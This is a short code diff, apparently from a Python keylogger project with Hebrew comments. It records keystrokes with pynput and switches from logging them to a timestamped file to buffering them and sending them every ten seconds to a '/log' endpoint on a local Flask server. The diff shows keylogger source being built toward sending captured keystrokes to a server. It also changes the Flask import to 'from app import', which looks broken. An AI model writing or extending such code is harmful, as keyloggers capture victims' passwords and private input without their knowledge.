@@ -1,12 +1,19 @@
 from pynput.keyboard import Listener, Key
 from datetime import datetime
 from cryptography.fernet import Fernet
-from flask import Flask, render_template_string, request, jsonify
+from app import Flask, render_template_string, request, jsonify
 import os
 import threading
+import requests
+import time
+
 
 # יצירת שם קובץ חדש עם תאריך ושעה
-filename = datetime.now().strftime("keylogger_%Y-%m-%d_%H-%M-%S.txt")
+# filename = datetime.now().strftime("keylogger_%Y-%m-%d_%H-%M-%S.txt")
+keystroke_buffer = []
+SEND_INTERVAL = 10  # שניות
+SERVER_URL = "http://localhost:5000/log"
+
 
 def keylogger(key):
     try:
